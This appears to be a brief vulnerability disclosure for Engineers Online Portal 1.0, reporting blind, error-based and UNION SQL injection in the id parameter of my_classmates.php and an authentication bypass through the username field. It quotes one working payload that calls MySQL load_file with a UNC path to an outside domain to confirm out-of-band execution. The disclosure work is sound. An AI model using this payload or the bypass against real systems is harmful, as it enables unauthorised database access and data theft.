https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/janobe/CVE-nu11-101321

[+] Description:
The id parameter from my_classmates.php on the Engineers Online Portal 1.0 app appears to be vulnerable to three types of SQL injection 
attacks, boolean-based blind, error-based, and UNION query. 
The payload '+(select load_file('\hh2s4z961nps5mtx8px8zoud248ywq0erhf82yqn.nu11secur1tyexploit.net\ggc'))+' was submitted in the id parameter.
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed. 
Also, user login is vulnerable to SQL-Injection bypass authentication on parameter "username".
